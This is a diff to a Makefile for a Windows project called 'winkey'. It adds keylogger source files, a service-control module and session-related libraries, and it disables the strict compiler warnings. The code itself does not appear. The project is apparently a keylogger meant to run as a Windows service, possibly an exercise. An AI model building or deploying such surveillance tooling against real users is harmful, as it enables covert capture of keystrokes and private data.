@@ -1,5 +1,5 @@
 #compiler/linker options
-CCFLAGS = /nologo /Wall /WX
+CCFLAGS = /nologo #/Wall /WX
 CCFLAG_DEBUG = /Zi /Od /FS /Fd:winkey.pdb
 LINKER = link.exe
 LINKEROPT = /nologo /DEBUG
@@ -10,10 +10,10 @@ DEL = del
 
 #WINKEY.exe related stuff
 DIR_WINKEY=winkey\srcs
-SRCS_WINKEY = $(DIR_WINKEY)\main.c $(DIR_WINKEY)\svc_ctrl.c
+SRCS_WINKEY = $(DIR_WINKEY)\main.c $(DIR_WINKEY)\svc_ctrl.c $(DIR_WINKEY)\error_handling.c $(DIR_WINKEY)\keylogger_utils.c $(DIR_WINKEY)\keylogger.c $(DIR_WINKEY)\log.c
 OBJS_WINKEY = $(SRCS_WINKEY:.c=.obj)
 INCL_WINKEY = /I .\winkey\includes
-LIBS_WINKEY = Kernel32.lib Advapi32.lib
+LIBS_WINKEY = Kernel32.lib Advapi32.lib Gdi32.lib User32.lib Wtsapi32.lib
 WINKEY = winkey.exe
 
 all: $(WINKEY)
